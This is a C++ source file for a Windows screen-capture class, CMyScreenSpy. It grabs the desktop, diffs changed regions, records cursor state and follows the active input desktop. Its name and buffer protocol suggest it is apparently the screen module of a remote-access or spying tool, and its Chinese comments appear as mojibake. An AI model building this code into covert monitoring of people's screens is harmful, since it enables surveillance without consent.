#include "StdAfx.h"
#include "MyScreenSpy.h"
#include "until.h"
#include "macros.h"
#include <tchar.h>

#define RGB2GRAY(r,g,b) (((b)*117 + (g)*601 + (r)*306) >> 10)

#define DEF_STEP	19
#define OFF_SET		24
//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////

CMyScreenSpy::CMyScreenSpy(int biBitCount, bool bIsGray, UINT nMaxFrameRate)
{
	switch (biBitCount)
	{
	case 1:
	case 4:
	case 8:
	case 16:
	case 32:
		m_biBitCount = biBitCount;
		break;

	default:
		m_biBitCount = 16;
	}

	if (!SelectInputWinStation())
	{
		m_hDeskTopWnd = GetDesktopWindow();
		m_hFullDC = GetDC(m_hDeskTopWnd);
	}

	m_dwBitBltRop = SRCCOPY;

	m_dwLastCapture = GetTickCount();
	m_bAlgorithm = ALGORITHM_DIFF; // Ĭ��ʹ�ø���ɨ���㷨
	m_nMaxFrameRate = nMaxFrameRate;
	m_dwSleep = 1000 / nMaxFrameRate;
	m_bIsGray = bIsGray;
	m_nFullWidth = ::GetSystemMetrics(SM_CXSCREEN);
	m_nFullHeight = ::GetSystemMetrics(SM_CYSCREEN);
	m_nIncSize = 32 / m_biBitCount;

	m_nStartLine = 0;

	m_hFullMemDC = ::CreateCompatibleDC(m_hFullDC);
	m_hDiffMemDC = ::CreateCompatibleDC(m_hFullDC);
	m_hLineMemDC = ::CreateCompatibleDC(NULL);
	m_hRectMemDC = ::CreateCompatibleDC(NULL);
	m_lpvLineBits = NULL;
	m_lpvFullBits = NULL;

	m_lpbmi_line = ConstructBI(m_biBitCount, m_nFullWidth, 1);
	m_lpbmi_full = ConstructBI(m_biBitCount, m_nFullWidth, m_nFullHeight);
	m_lpbmi_rect = ConstructBI(m_biBitCount, m_nFullWidth, 1);

	m_hLineBitmap = ::CreateDIBSection(m_hFullDC, m_lpbmi_line, DIB_RGB_COLORS, &m_lpvLineBits, NULL, NULL);
	m_hFullBitmap = ::CreateDIBSection(m_hFullDC, m_lpbmi_full, DIB_RGB_COLORS, &m_lpvFullBits, NULL, NULL);
	m_hDiffBitmap = ::CreateDIBSection(m_hFullDC, m_lpbmi_full, DIB_RGB_COLORS, &m_lpvDiffBits, NULL, NULL);

	::SelectObject(m_hFullMemDC, m_hFullBitmap);
	::SelectObject(m_hLineMemDC, m_hLineBitmap);
	::SelectObject(m_hDiffMemDC, m_hDiffBitmap);

	::SetRect(&m_changeRect, 0, 0, m_nFullWidth, m_nFullHeight);

	// �㹻��
	m_rectBuffer = new BYTE[m_lpbmi_full->bmiHeader.biSizeImage * 2];
	*m_rectBuffer = TOKEN_NEXTSCREEN;
	m_nDataSizePerLine = m_lpbmi_full->bmiHeader.biSizeImage / m_nFullHeight;

	m_rectBufferOffset = 0;
}

CMyScreenSpy::~CMyScreenSpy()
{
	::ReleaseDC(m_hDeskTopWnd, m_hFullDC);

	::DeleteDC(m_hLineMemDC);
	::DeleteDC(m_hFullMemDC);
	::DeleteDC(m_hRectMemDC);
	::DeleteDC(m_hDiffMemDC);

	::DeleteObject(m_hLineBitmap);
	::DeleteObject(m_hFullBitmap);
	::DeleteObject(m_hDiffBitmap);

	if (m_rectBuffer)
		delete[] m_rectBuffer;

	delete[]	m_lpbmi_full;
	delete[]	m_lpbmi_line;
	delete[]	m_lpbmi_rect;
}

// ����Ƚ��㷨��ĺ���
int CMyScreenSpy::Compare(LPBYTE lpSource, LPBYTE lpDest, LPBYTE lpBuffer, DWORD dwSize)
{
	// Windows�涨һ��ɨ������ռ���ֽ���������4�ı���, ������DWORD�Ƚ�
	LPDWORD	p1, p2;
	p1 = (LPDWORD)lpDest;
	p2 = (LPDWORD)lpSource;

	// ƫ�Ƶ�ƫ�ƣ���ͬ���ȵ�ƫ��
	int	nOffsetOffset = 0, nBytesOffset = 0, nDataOffset = 0;
	int nCount = 0; // ���ݼ�����

	// p1++ʵ�����ǵ�����һ��DWORD
	for (unsigned int i = 0; i < dwSize; i += 4, p1++, p2++)
	{
		if (*p1 == *p2)
			continue;
		// һ�������ݿ鿪ʼ
		// д��ƫ�Ƶ�ַ
		*(LPDWORD)(lpBuffer + nOffsetOffset) = i;
		// ��¼���ݴ�С�Ĵ��λ��
		nBytesOffset = nOffsetOffset + sizeof(int);
		nDataOffset = nBytesOffset + sizeof(int);
		nCount = 0; // ���ݼ���������

		// ����Dest�е�����
		*p1 = *p2;
		*(LPDWORD)(lpBuffer + nDataOffset + nCount) = *p2;

		nCount += 4;
		i += 4, p1++, p2++;

		for (int j = i; (unsigned long)j < dwSize; j += 4, i += 4, p1++, p2++)
		{
			if (*p1 == *p2)
				break;

			// ����Dest�е�����
			*p1 = *p2;
			*(LPDWORD)(lpBuffer + nDataOffset + nCount) = *p2;
			nCount += 4;
		}
		// д�����ݳ���
		*(LPDWORD)(lpBuffer + nBytesOffset) = nCount;
		nOffsetOffset = nDataOffset + nCount;
	}

	// nOffsetOffset ����д����ܴ�С
	return nOffsetOffset;
}

void CMyScreenSpy::setAlgorithm(UINT nAlgorithm)
{
	InterlockedExchange((LPLONG)&m_bAlgorithm, nAlgorithm);
}

LPBYTE CMyScreenSpy::getNextScreen(LPDWORD lpdwBytes)
{
	static LONG	nOldCursorPosY = 0;
	//if (lpdwBytes == NULL || m_rectBuffer == NULL)
	//	return NULL;

	SelectInputWinStation();

	// ����rect������ָ��
	m_rectBufferOffset = 1;

	// д��ʹ���������㷨
	WriteRectBuffer((LPBYTE)&m_bAlgorithm, sizeof(m_bAlgorithm));

	// д����λ��
	POINT CursorPos;
	GetCursorPos(&CursorPos);
	WriteRectBuffer((LPBYTE)&CursorPos, sizeof(POINT));

	// д�뵱ǰ�������
	BYTE bCursorIndex = m_CursorInfo.getCurrentCursorIndex();
	WriteRectBuffer(&bCursorIndex, sizeof(BYTE));

	// ����Ƚ��㷨
	if (m_bAlgorithm == ALGORITHM_DIFF)
	{
		// �ֶ�ɨ��ȫ��Ļ
		ScanScreen(m_hDiffMemDC, m_hFullDC, m_lpbmi_full->bmiHeader.biWidth, m_lpbmi_full->bmiHeader.biHeight);

		*lpdwBytes = m_rectBufferOffset +
			Compare((LPBYTE)m_lpvDiffBits, (LPBYTE)m_lpvFullBits, m_rectBuffer + m_rectBufferOffset, m_lpbmi_full->bmiHeader.biSizeImage);

		return m_rectBuffer;
	}

	// ���λ�÷��仯�����ȵ�������������仯����(�����仯���� + DEF_STEP)����ɨ��
	// ������
	int	nHotspot = max(0, CursorPos.y - DEF_STEP);

	for (int i = ((CursorPos.y != nOldCursorPosY) && ScanChangedRect(nHotspot)) ? (nHotspot + DEF_STEP) : m_nStartLine;
		i < m_nFullHeight;
		i += DEF_STEP)
	{
		if (ScanChangedRect(i))
		{
			i += DEF_STEP;
		}
	}
	nOldCursorPosY = CursorPos.y;

	m_nStartLine = (m_nStartLine + 3) % DEF_STEP;
	*lpdwBytes = m_rectBufferOffset;

	// ���Ʒ���֡���ٶ�
	//while (GetTickCount() - m_dwLastCapture < m_dwSleep)
	//	Sleep(1);
	//InterlockedExchange((LPLONG)&m_dwLastCapture, GetTickCount());

	return m_rectBuffer;
}

bool CMyScreenSpy::ScanChangedRect(int nStartLine)
{
	bool bRet = false;
	LPDWORD p1, p2;
	::BitBlt(m_hLineMemDC, 0, 0, m_nFullWidth, 1, m_hFullDC, 0, nStartLine, m_dwBitBltRop);
	// 0 �����һ��
	p1 = (PDWORD)((DWORD)m_lpvFullBits + ((m_nFullHeight - 1 - nStartLine) * m_nDataSizePerLine));
	p2 = (PDWORD)m_lpvLineBits;
	::SetRect(&m_changeRect, -1, nStartLine - DEF_STEP, -1, nStartLine + DEF_STEP * 2);

	for (int j = 0; j < m_nFullWidth; j += m_nIncSize)
	{
		if (*p1 != *p2)
		{
			if (m_changeRect.right < 0)
				m_changeRect.left = j - OFF_SET;
			m_changeRect.right = j + OFF_SET;
		}
		p1++;
		p2++;
	}

	if (m_changeRect.right > -1)
	{
		m_changeRect.left = max(m_changeRect.left, 0);
		m_changeRect.top = max(m_changeRect.top, 0);
		m_changeRect.right = min(m_changeRect.right, m_nFullWidth);
		m_changeRect.bottom = min(m_changeRect.bottom, m_nFullHeight);
		// ���Ƹı������
		CopyRect(&m_changeRect);
		bRet = true;
	}

	return bRet;
}

LPBITMAPINFO CMyScreenSpy::ConstructBI(int biBitCount, int biWidth, int biHeight)
{
	/*
	biBitCount Ϊ1 (�ڰ׶�ɫͼ) ��4 (16 ɫͼ) ��8 (256 ɫͼ) ʱ����ɫ������ָ����ɫ����С
	biBitCount Ϊ16 (16 λɫͼ) ��24 (���ɫͼ, ��֧��) ��32 (32 λɫͼ) ʱû����ɫ��
	*/
	int	color_num = biBitCount <= 8 ? 1 << biBitCount : 0;

	int nBISize = sizeof(BITMAPINFOHEADER) + (color_num * sizeof(RGBQUAD));
	BITMAPINFO	*lpbmi = (BITMAPINFO *) new BYTE[nBISize];

	BITMAPINFOHEADER	*lpbmih = &(lpbmi->bmiHeader);
	lpbmih->biSize = sizeof(BITMAPINFOHEADER);
	lpbmih->biWidth = biWidth;
	lpbmih->biHeight = biHeight;
	lpbmih->biPlanes = 1;
	lpbmih->biBitCount = biBitCount;
	lpbmih->biCompression = BI_RGB;
	lpbmih->biXPelsPerMeter = 0;
	lpbmih->biYPelsPerMeter = 0;
	lpbmih->biClrUsed = 0;
	lpbmih->biClrImportant = 0;
	lpbmih->biSizeImage = (((lpbmih->biWidth * lpbmih->biBitCount + 31) & ~31) >> 3) * lpbmih->biHeight;

	// 16λ���Ժ��û����ɫ����ֱ�ӷ���
	if (biBitCount >= 16)
		return lpbmi;
	/*
	Windows 95��Windows 98�����lpvBits����ΪNULL����GetDIBits�ɹ��������BITMAPINFO�ṹ����ô����ֵΪλͼ���ܹ���ɨ��������

	Windows NT�����lpvBits����ΪNULL����GetDIBits�ɹ��������BITMAPINFO�ṹ����ô����ֵΪ��0���������ִ��ʧ�ܣ���ô������0ֵ��Windows NT�������ø��������Ϣ�������callGetLastError������
	*/

	HDC	hDC = GetDC(NULL);
	HBITMAP hBmp = CreateCompatibleBitmap(hDC, 1, 1); // �߿�����Ϊ0

	GetDIBits(hDC, hBmp, 0, 0, NULL, lpbmi, DIB_RGB_COLORS);

	ReleaseDC(NULL, hDC);
	DeleteObject(hBmp);

	if (m_bIsGray)
	{
		for (int i = 0; i < color_num; i++)
		{
			int color = RGB2GRAY(lpbmi->bmiColors[i].rgbRed, lpbmi->bmiColors[i].rgbGreen, lpbmi->bmiColors[i].rgbBlue);
			lpbmi->bmiColors[i].rgbRed = lpbmi->bmiColors[i].rgbGreen = lpbmi->bmiColors[i].rgbBlue = color;
		}
	}

	return lpbmi;
}

void CMyScreenSpy::WriteRectBuffer(LPBYTE	lpData, int nCount)
{
	memcpy(m_rectBuffer + m_rectBufferOffset, lpData, nCount);
	m_rectBufferOffset += nCount;
}

LPVOID CMyScreenSpy::getFirstScreen()
{
	::BitBlt(m_hFullMemDC, 0, 0, m_nFullWidth, m_nFullHeight, m_hFullDC, 0, 0, m_dwBitBltRop);
	return m_lpvFullBits;
}

void CMyScreenSpy::CopyRect(LPRECT lpRect)
{
	int	nRectWidth = lpRect->right - lpRect->left;
	int	nRectHeight = lpRect->bottom - lpRect->top;

	LPVOID	lpvRectBits = NULL;
	// ����m_lpbmi_rect
	m_lpbmi_rect->bmiHeader.biWidth = nRectWidth;
	m_lpbmi_rect->bmiHeader.biHeight = nRectHeight;
	m_lpbmi_rect->bmiHeader.biSizeImage = (((m_lpbmi_rect->bmiHeader.biWidth * m_lpbmi_rect->bmiHeader.biBitCount + 31) & ~31) >> 3)
		* m_lpbmi_rect->bmiHeader.biHeight;

	HBITMAP	hRectBitmap = ::CreateDIBSection(m_hFullDC, m_lpbmi_rect, DIB_RGB_COLORS, &lpvRectBits, NULL, NULL);

	::SelectObject(m_hRectMemDC, hRectBitmap);

	::BitBlt(m_hFullMemDC, lpRect->left, lpRect->top, nRectWidth, nRectHeight, m_hFullDC, lpRect->left, lpRect->top, m_dwBitBltRop);
	::BitBlt(m_hRectMemDC, 0, 0, nRectWidth, nRectHeight, m_hFullMemDC, lpRect->left, lpRect->top, SRCCOPY);

	WriteRectBuffer((LPBYTE)lpRect, sizeof(RECT));
	WriteRectBuffer((LPBYTE)lpvRectBits, m_lpbmi_rect->bmiHeader.biSizeImage);

	DeleteObject(hRectBitmap);
}

UINT CMyScreenSpy::getFirstImageSize()
{
	return m_lpbmi_full->bmiHeader.biSizeImage;
}

void CMyScreenSpy::setCaptureLayer(bool bIsCaptureLayer)
{
	DWORD dwRop = SRCCOPY;
	if (bIsCaptureLayer)
		dwRop |= CAPTUREBLT;

	InterlockedExchange((LPLONG)&m_dwBitBltRop, dwRop);
}

LPBITMAPINFO CMyScreenSpy::getBI()
{
	return m_lpbmi_full;
}

UINT CMyScreenSpy::getBISize()
{
	int	color_num = m_biBitCount <= 8 ? 1 << m_biBitCount : 0;

	return sizeof(BITMAPINFOHEADER) + (color_num * sizeof(RGBQUAD));
}

bool CMyScreenSpy::SelectInputWinStation()
{
	bool bRet = ::SwitchInputDesktop();
	if (bRet)
	{
		ReleaseDC(m_hDeskTopWnd, m_hFullDC);
		m_hDeskTopWnd = GetDesktopWindow();
		m_hFullDC = GetDC(m_hDeskTopWnd);
	}

	return bRet;
}

void CMyScreenSpy::ScanScreen(HDC hdcDest, HDC hdcSrc, int nWidth, int nHeight)
{
	UINT	nJumpLine = 50;
	UINT	nJumpSleep = nJumpLine / 10; // ɨ����
	// ɨ����Ļ
	for (int i = 0, nToJump = 0; i < nHeight; i += nToJump)
	{
		int	nOther = nHeight - i;

		if ((unsigned int)nOther > nJumpLine)
			nToJump = nJumpLine;
		else
			nToJump = nOther;
		BitBlt(hdcDest, 0, i, nWidth, nToJump, hdcSrc, 0, i, m_dwBitBltRop);
		Sleep(nJumpSleep);
	}
}